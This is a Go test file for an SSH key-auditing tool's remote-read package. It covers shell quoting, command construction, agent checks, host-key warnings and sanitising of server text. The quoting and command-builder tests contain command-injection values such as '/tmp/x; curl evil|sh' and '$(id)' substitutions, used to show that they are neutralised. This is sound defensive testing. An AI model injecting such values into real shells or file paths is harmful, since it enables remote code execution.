package sshread

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"crypto/ed25519"
	"crypto/elliptic"
	"crypto/rand"
	"errors"
	"log/slog"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/agent"
	"golang.org/x/crypto/ssh/knownhosts"

	"github.com/javadh75/SSHepherd/internal/clog"
	"github.com/javadh75/SSHepherd/internal/config"
	"github.com/javadh75/SSHepherd/internal/testkeys"
)

// ed25519Key parses a deterministic ssh-ed25519 public key for tests.
func ed25519Key(t *testing.T, seed byte) ssh.PublicKey {
	t.Helper()
	k, _, _, _, err := ssh.ParseAuthorizedKey([]byte(testkeys.Line(t, seed)))
	if err != nil {
		t.Fatalf("parse test key: %v", err)
	}
	return k
}

// ecdsaKey generates an ECDSA host key — a different type than ed25519Key.
func ecdsaKey(t *testing.T) ssh.PublicKey {
	t.Helper()
	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatalf("generate ecdsa: %v", err)
	}
	pub, err := ssh.NewPublicKey(&priv.PublicKey)
	if err != nil {
		t.Fatalf("wrap ecdsa: %v", err)
	}
	return pub
}

func TestInterpretExit(t *testing.T) {
	tests := []struct {
		name       string
		code       int
		stderr     string
		wantAbsent bool
		wantErr    bool
	}{
		{"success", 0, "", false, false},
		{"file absent", fileAbsentExit, "", true, false},
		{"cat failure", 1, "cat: permission denied", false, true},
		{"other failure", 127, "sh: not found", false, true},
		// ${HOME:?} in the built command fails the shell with a non-44 exit
		// when HOME is unset remotely: that must surface as a normal remote
		// read error, never as FileAbsent (which would misreport false drift).
		{"HOME unset (${HOME:?} guard)", 2, "sh: 1: HOME: parameter not set or null", false, true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			absent, err := interpretExit(tt.code, tt.stderr)
			if absent != tt.wantAbsent {
				t.Errorf("absent = %v, want %v", absent, tt.wantAbsent)
			}
			if (err != nil) != tt.wantErr {
				t.Errorf("err = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.stderr != "" && !strings.Contains(err.Error(), strings.TrimSpace(tt.stderr)) {
				t.Errorf("err %q should include remote stderr", err)
			}
		})
	}
}

func TestShQuote(t *testing.T) {
	tests := []struct {
		name, in, want string
	}{
		{"plain", "abc", `'abc'`},
		{"empty", "", `''`},
		{"embedded single quote", "a'b", `'a'\''b'`},
		{"lone single quote", "'", `''\'''`},
		{"spaces", "a b", `'a b'`},
		{"metachars inert", "/tmp/x; $(id) `id` |&&", "'/tmp/x; $(id) `id` |&&'"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := shQuote(tt.in); got != tt.want {
				t.Errorf("shQuote(%q) = %s, want %s", tt.in, got, tt.want)
			}
		})
	}
}

func TestAuthorizedKeysCmdFor(t *testing.T) {
	const tail = `; if [ -e "$p" ]; then cat "$p"; else exit 44; fi`
	tests := []struct {
		name, path, want string
	}{
		// The default (unset) path: string differs from the pre-override
		// const, but TestDefaultCmdBehavesLikeOldConst pins behavioral
		// equivalence through a real sh.
		{"default", defaultAuthorizedKeysPath, `p="${HOME:?}"/'.ssh/authorized_keys'` + tail},
		{"absolute", "/etc/ssh/authorized_keys.d/deploy", `p='/etc/ssh/authorized_keys.d/deploy'` + tail},
		{"home-relative with spaces", "~/my keys/auth", `p="${HOME:?}"/'my keys/auth'` + tail},
		{"absolute with single quote", "/etc/o'brien/keys", `p='/etc/o'\''brien/keys'` + tail},
		{"hostile command injection", "/tmp/x; curl evil|sh", `p='/tmp/x; curl evil|sh'` + tail},
		{"hostile substitution", "/tmp/$(id)/`id`", "p='/tmp/$(id)/`id`'" + tail},
		{"hostile double quote", `/tmp/a"b`, `p='/tmp/a"b'` + tail},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := authorizedKeysCmdFor(tt.path); got != tt.want {
				t.Errorf("authorizedKeysCmdFor(%q) =\n  %s\nwant\n  %s", tt.path, got, tt.want)
			}
		})
	}
}

// TestDefaultCmdBehavesLikeOldConst proves the unset path is observably
// unchanged: the builder's default command and the pre-override const behave
// identically through a real sh — same stdout and same exit code, both when
// the file exists and when it is absent (exit 44 sentinel).
func TestDefaultCmdBehavesLikeOldConst(t *testing.T) {
	const oldCmd = `if [ -e ~/.ssh/authorized_keys ]; then cat ~/.ssh/authorized_keys; else exit 44; fi`
	newCmd := authorizedKeysCmdFor(defaultAuthorizedKeysPath)

	home := t.TempDir()
	run := func(cmd string) (string, int) {
		t.Helper()
		c := exec.Command("sh", "-c", cmd)
		c.Env = append(os.Environ(), "HOME="+home)
		out, err := c.Output()
		code := 0
		var exitErr *exec.ExitError
		if errors.As(err, &exitErr) {
			code = exitErr.ExitCode()
		} else if err != nil {
			t.Fatalf("sh -c %q: %v", cmd, err)
		}
		return string(out), code
	}

	t.Run("file absent", func(t *testing.T) {
		oldOut, oldCode := run(oldCmd)
		newOut, newCode := run(newCmd)
		if oldOut != newOut || oldCode != newCode {
			t.Errorf("absent: old = (%q, %d), new = (%q, %d)", oldOut, oldCode, newOut, newCode)
		}
		if newCode != fileAbsentExit {
			t.Errorf("absent exit = %d, want %d", newCode, fileAbsentExit)
		}
	})
	t.Run("file present", func(t *testing.T) {
		if err := os.MkdirAll(filepath.Join(home, ".ssh"), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(home, ".ssh", "authorized_keys"), []byte("key-line\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		oldOut, oldCode := run(oldCmd)
		newOut, newCode := run(newCmd)
		if oldOut != newOut || oldCode != newCode {
			t.Errorf("present: old = (%q, %d), new = (%q, %d)", oldOut, oldCode, newOut, newCode)
		}
		if newOut != "key-line\n" || newCode != 0 {
			t.Errorf("present = (%q, %d), want (\"key-line\\n\", 0)", newOut, newCode)
		}
	})
}

func TestCheckAgent(t *testing.T) {
	t.Run("unset", func(t *testing.T) {
		if err := CheckAgent(context.Background(), ""); err == nil || !strings.Contains(err.Error(), "SSH_AUTH_SOCK") {
			t.Errorf("CheckAgent(\"\") = %v, want SSH_AUTH_SOCK error", err)
		}
	})
	t.Run("dead socket", func(t *testing.T) {
		if err := CheckAgent(context.Background(), filepath.Join(t.TempDir(), "nope.sock")); err == nil {
			t.Error("CheckAgent(dead) = nil, want error")
		}
	})
	t.Run("agent with keys", func(t *testing.T) {
		if err := CheckAgent(context.Background(), serveAgent(t, true)); err != nil {
			t.Errorf("CheckAgent(agent with keys) = %v, want nil", err)
		}
	})
	t.Run("empty agent", func(t *testing.T) {
		// The socket answers the agent protocol but holds zero keys: every
		// later per-server auth would fail. The preflight must say so once.
		err := CheckAgent(context.Background(), serveAgent(t, false))
		if err == nil || !strings.Contains(err.Error(), "no keys") {
			t.Errorf("CheckAgent(empty agent) = %v, want a no-keys error", err)
		}
		if err != nil && !strings.Contains(err.Error(), "ssh-add") {
			t.Errorf("err %q should tell the operator to run ssh-add", err)
		}
	})
	t.Run("canceled context", func(t *testing.T) {
		// Ctrl-C during the preflight must abort the dial: the caller's
		// context flows into DialContext instead of being dropped.
		ctx, cancel := context.WithCancel(context.Background())
		cancel()
		err := CheckAgent(ctx, serveAgent(t, true))
		if !errors.Is(err, context.Canceled) {
			t.Errorf("CheckAgent(canceled ctx) = %v, want context.Canceled", err)
		}
	})
	t.Run("unresponsive socket", func(t *testing.T) {
		// Reachable but not speaking the agent protocol (closes on accept).
		sock := filepath.Join(shortTempDir(t), "agent.sock")
		l, err := (&net.ListenConfig{}).Listen(context.Background(), "unix", sock)
		if err != nil {
			t.Fatalf("listen: %v", err)
		}
		defer l.Close()
		go func() {
			for {
				c, err := l.Accept()
				if err != nil {
					return
				}
				c.Close()
			}
		}()
		if err := CheckAgent(context.Background(), sock); err == nil {
			t.Error("CheckAgent(unresponsive) = nil, want error")
		}
	})
}

// shortTempDir returns a temp dir with a short absolute path: unix socket
// paths are capped (~104 bytes on macOS) and t.TempDir() embeds the full
// subtest name, which can exceed it.
func shortTempDir(t *testing.T) string {
	t.Helper()
	dir, err := os.MkdirTemp("", "ag")
	if err != nil {
		t.Fatalf("mkdtemp: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(dir) })
	return dir
}

// serveAgent runs a real in-memory SSH agent on a unix socket, holding one
// generated key when withKey is set, and returns the socket path.
func serveAgent(t *testing.T, withKey bool) string {
	t.Helper()
	keyring := agent.NewKeyring()
	if withKey {
		_, priv, err := ed25519.GenerateKey(rand.Reader)
		if err != nil {
			t.Fatalf("generate key: %v", err)
		}
		if err := keyring.Add(agent.AddedKey{PrivateKey: priv}); err != nil {
			t.Fatalf("keyring add: %v", err)
		}
	}
	sock := filepath.Join(shortTempDir(t), "agent.sock")
	l, err := (&net.ListenConfig{}).Listen(context.Background(), "unix", sock)
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	t.Cleanup(func() { _ = l.Close() })
	go func() {
		for {
			c, err := l.Accept()
			if err != nil {
				return
			}
			go func() {
				_ = agent.ServeAgent(keyring, c) // returns on client close (EOF)
				_ = c.Close()
			}()
		}
	}()
	return sock
}

func TestHostKeyHint(t *testing.T) {
	srv := config.Server{Name: "web-1", Host: "10.0.0.1", Port: 22, User: "deploy"}

	t.Run("unknown host gets keyscan hint", func(t *testing.T) {
		err := hostKeyHint(&knownhosts.KeyError{}, ed25519Key(t, 1), srv, "/kh")
		if !strings.Contains(err.Error(), "ssh-keyscan -p 22 10.0.0.1") {
			t.Errorf("hint = %q, want exact-host keyscan command", err)
		}
	})
	t.Run("same-type mismatch gets changed-key warning", func(t *testing.T) {
		// known_hosts records one ed25519 key; the host presents a different
		// ed25519 key — that is a genuine changed-key alarm.
		ke := &knownhosts.KeyError{Want: []knownhosts.KnownKey{{Key: ed25519Key(t, 2)}}}
		err := hostKeyHint(ke, ed25519Key(t, 1), srv, "/kh")
		if !strings.Contains(err.Error(), "HOST KEY CHANGED") {
			t.Errorf("hint = %q, want changed-key warning", err)
		}
		if !strings.Contains(err.Error(), "presented ssh-ed25519 key SHA256:") {
			t.Errorf("hint = %q, want the presented key identified", err)
		}
	})
	t.Run("unrecorded key type gets keyscan-refresh hint, not alarm", func(t *testing.T) {
		// known_hosts records only an ed25519 key; the host presents an ECDSA
		// key — no recorded key of that type exists, so this is likely a
		// stale known_hosts entry, not a hostile key swap.
		ke := &knownhosts.KeyError{Want: []knownhosts.KnownKey{{Key: ed25519Key(t, 2)}}}
		err := hostKeyHint(ke, ecdsaKey(t), srv, "/kh")
		if strings.Contains(err.Error(), "HOST KEY CHANGED") {
			t.Errorf("hint = %q, must not raise the changed-key alarm", err)
		}
		if !strings.Contains(err.Error(), "not recorded in known_hosts") {
			t.Errorf("hint = %q, want unrecorded-type wording", err)
		}
		if !strings.Contains(err.Error(), "recorded: ssh-ed25519") {
			t.Errorf("hint = %q, want the recorded types listed", err)
		}
	})
	t.Run("unrelated error passes through", func(t *testing.T) {
		orig := net.ErrClosed
		if got := hostKeyHint(orig, ed25519Key(t, 1), srv, "/kh"); !errors.Is(got, orig) {
			t.Errorf("unrelated error was wrapped: %v", got)
		}
	})
}

func TestClientBadAgentSock(t *testing.T) {
	c := &Client{
		AgentSock:      filepath.Join(t.TempDir(), "nope.sock"),
		KnownHostsPath: filepath.Join(t.TempDir(), "kh"),
		DialTimeout:    time.Second,
	}
	srv := config.Server{Name: "s", Host: "127.0.0.1", Port: 1, User: "u"}
	_, err := c.ReadAuthorizedKeys(context.Background(), srv)
	if err == nil || !strings.Contains(err.Error(), "agent") {
		t.Errorf("err = %v, want agent connection error", err)
	}
}

func TestClientBadKnownHostsPath(t *testing.T) {
	sock := filepath.Join(t.TempDir(), "agent.sock")
	l, err := (&net.ListenConfig{}).Listen(context.Background(), "unix", sock)
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer l.Close()
	go func() {
		for {
			c, err := l.Accept()
			if err != nil {
				return
			}
			c.Close()
		}
	}()
	c := &Client{
		AgentSock:      sock,
		KnownHostsPath: filepath.Join(t.TempDir(), "does-not-exist"),
		DialTimeout:    time.Second,
	}
	srv := config.Server{Name: "s", Host: "127.0.0.1", Port: 1, User: "u"}
	_, err = c.ReadAuthorizedKeys(context.Background(), srv)
	if err == nil || !strings.Contains(err.Error(), "known_hosts") {
		t.Errorf("err = %v, want known_hosts load error", err)
	}
}

func TestCappedBuffer(t *testing.T) {
	b := &cappedBuffer{limit: 8}

	n, err := b.Write([]byte("12345"))
	if n != 5 || err != nil {
		t.Fatalf("Write under cap = (%d, %v), want (5, nil)", n, err)
	}
	if b.truncated {
		t.Error("truncated = true before cap was hit")
	}

	n, err = b.Write([]byte("6789A")) // only 3 bytes of room left
	if n != 5 || err != nil {
		t.Fatalf("Write over cap = (%d, %v), want (5, nil) — must report full length, never fail", n, err)
	}
	if !b.truncated {
		t.Error("truncated = false after overflowing the cap")
	}
	if got := b.String(); got != "12345678" {
		t.Errorf("String() = %q, want first 8 bytes only", got)
	}

	n, err = b.Write([]byte("x")) // already full
	if n != 1 || err != nil {
		t.Errorf("Write past full = (%d, %v), want (1, nil)", n, err)
	}
	if got := len(b.Bytes()); got != 8 {
		t.Errorf("len = %d after writes past cap, want 8", got)
	}

	// Filling exactly to the cap is not truncation, and empty writes at the
	// cap must not flag it either.
	exact := &cappedBuffer{limit: 2}
	_, _ = exact.Write([]byte("ab"))
	_, _ = exact.Write(nil)
	if exact.truncated {
		t.Error("exact-fit buffer flagged as truncated")
	}
}

// sanitizedError control-strips at the KeyReader boundary: handshake errors
// can embed server-supplied text (disconnect messages, algorithm names).
func TestSanitizedError(t *testing.T) {
	e := sanitizedError{errors.New("bad\x1b[31m\x07host")}
	if got := e.Error(); strings.ContainsAny(got, "\x1b\x07") {
		t.Errorf("Error() = %q, must not contain control bytes", got)
	}
	if got, want := e.Error(), "bad[31mhost"; got != want {
		t.Errorf("Error() = %q, want %q (control bytes stripped)", got, want)
	}
	if !errors.Is(sanitizedError{context.DeadlineExceeded}, context.DeadlineExceeded) {
		t.Error("errors.Is through sanitizedError = false, want true (Unwrap must preserve the chain)")
	}
}

func TestSanitizeRemote(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{"C0 controls stripped, newline and tab kept", "a\x1b[31mred\x07\rb\nc\td\x00", "a[31mredb\nc\td"},
		{"clean text unaltered", "clean text", "clean text"},
		{"DEL stripped", "a\x7fb", "ab"},
		{"C1 CSI (U+009B) stripped", "a\u009bb", "ab"},
		{"raw C1 byte becomes replacement rune", "a\x9bb", "a\ufffdb"},
		{"bidi override (Cf) stripped", "user\u202eevil\u202c", "userevil"},
		{"zero-width space (Cf) stripped", "a\u200bb", "ab"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := sanitizeRemote(tt.in); got != tt.want {
				t.Errorf("sanitizeRemote(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

// startFakeAgent serves a unix socket that accepts and holds connections —
// enough for the client's agent dial to succeed without a real agent.
func startFakeAgent(t *testing.T) string {
	t.Helper()
	sock := filepath.Join(t.TempDir(), "agent.sock")
	l, err := (&net.ListenConfig{}).Listen(context.Background(), "unix", sock)
	if err != nil {
		t.Fatalf("listen agent: %v", err)
	}
	holder := newConnHolder(l)
	t.Cleanup(holder.close)
	return sock
}

// connHolder accepts connections and keeps them open (a silent peer) until
// closed, so client-side deadlines — not peer EOFs — end the exchange.
type connHolder struct {
	l     net.Listener
	mu    sync.Mutex
	conns []net.Conn
}

func newConnHolder(l net.Listener) *connHolder {
	h := &connHolder{l: l}
	go func() {
		for {
			c, err := l.Accept()
			if err != nil {
				return
			}
			h.mu.Lock()
			h.conns = append(h.conns, c)
			h.mu.Unlock()
		}
	}()
	return h
}

func (h *connHolder) close() {
	_ = h.l.Close()
	h.mu.Lock()
	defer h.mu.Unlock()
	for _, c := range h.conns {
		_ = c.Close()
	}
}

// TestClientDeadline pins the hard time bound on the whole SSH exchange: a
// server that accepts TCP but never speaks SSH must not hang a worker beyond
// the ctx deadline — or, absent one, the derived 3×DialTimeout floor.
func TestClientDeadline(t *testing.T) {
	l, err := (&net.ListenConfig{}).Listen(context.Background(), "tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	holder := newConnHolder(l)
	t.Cleanup(holder.close)

	kh := filepath.Join(t.TempDir(), "known_hosts")
	if err := os.WriteFile(kh, nil, 0o600); err != nil {
		t.Fatalf("write known_hosts: %v", err)
	}
	agentSock := startFakeAgent(t)
	srv := config.Server{
		Name: "silent", Host: "127.0.0.1",
		Port: l.Addr().(*net.TCPAddr).Port, User: "u",
	}

	t.Run("ctx deadline bounds the handshake", func(t *testing.T) {
		c := &Client{AgentSock: agentSock, KnownHostsPath: kh, DialTimeout: 5 * time.Second}
		ctx, cancel := context.WithTimeout(context.Background(), 200*time.Millisecond)
		defer cancel()
		start := time.Now()
		_, err := c.ReadAuthorizedKeys(ctx, srv)
		elapsed := time.Since(start)
		if err == nil {
			t.Fatal("silent server produced no error")
		}
		if elapsed > time.Second {
			t.Errorf("returned after %v, want well under 1s (200ms deadline)", elapsed)
		}
	})

	t.Run("deadline floor kicks in without a ctx deadline", func(t *testing.T) {
		c := &Client{AgentSock: agentSock, KnownHostsPath: kh, DialTimeout: 100 * time.Millisecond}
		start := time.Now()
		_, err := c.ReadAuthorizedKeys(context.Background(), srv) // no deadline: floor = 300ms
		elapsed := time.Since(start)
		if err == nil {
			t.Fatal("silent server produced no error")
		}
		if elapsed > time.Second {
			t.Errorf("returned after %v, want well under 1s (300ms derived floor)", elapsed)
		}
	})
}

// TestClientLogNilSafe: an unset Log field must yield a usable logger.
func TestClientLogNilSafe(_ *testing.T) {
	c := &Client{}
	c.log().Debug("must not panic")
}

func TestFinishRead(t *testing.T) {
	discard := slog.New(slog.DiscardHandler)
	content := &cappedBuffer{limit: 10}
	_, _ = content.Write([]byte("key-line\n"))

	t.Run("content returned", func(t *testing.T) {
		res, err := finishRead(0, content, &cappedBuffer{limit: 10}, "h:22", discard)
		if err != nil || string(res.Content) != "key-line\n" || res.FileAbsent {
			t.Fatalf("got (%q, absent=%v, %v)", res.Content, res.FileAbsent, err)
		}
	})
	t.Run("absent sentinel", func(t *testing.T) {
		res, err := finishRead(fileAbsentExit, &cappedBuffer{limit: 10}, &cappedBuffer{limit: 10}, "h:22", discard)
		if err != nil || !res.FileAbsent {
			t.Fatalf("got (absent=%v, %v), want (true, nil)", res.FileAbsent, err)
		}
	})
	t.Run("stdout truncation is an error", func(t *testing.T) {
		trunc := &cappedBuffer{limit: 2}
		_, _ = trunc.Write([]byte("too long"))
		_, err := finishRead(0, trunc, &cappedBuffer{limit: 10}, "h:22", discard)
		if err == nil || !strings.Contains(err.Error(), "refusing to audit") {
			t.Fatalf("err = %v, want the truncation refusal", err)
		}
	})
	t.Run("stderr truncation warns but succeeds", func(t *testing.T) {
		var logBuf bytes.Buffer
		log := slog.New(clog.NewHandler(&logBuf, clog.Options{Level: slog.LevelInfo}))
		errTrunc := &cappedBuffer{limit: 2}
		_, _ = errTrunc.Write([]byte("noisy remote stderr"))
		res, err := finishRead(0, content, errTrunc, "h:22", log)
		if err != nil || string(res.Content) != "key-line\n" {
			t.Fatalf("got (%q, %v), want content and nil error", res.Content, err)
		}
		if !strings.Contains(logBuf.String(), "warn: h:22: remote stderr exceeded") {
			t.Errorf("log = %q, want the stderr-truncation warn", logBuf.String())
		}
	})
	t.Run("nonzero exit is an error", func(t *testing.T) {
		errOut := &cappedBuffer{limit: 100}
		_, _ = errOut.Write([]byte("cat: permission denied"))
		_, err := finishRead(1, &cappedBuffer{limit: 10}, errOut, "h:22", discard)
		if err == nil || !strings.Contains(err.Error(), "permission denied") {
			t.Fatalf("err = %v, want the remote stderr embedded", err)
		}
	})
}
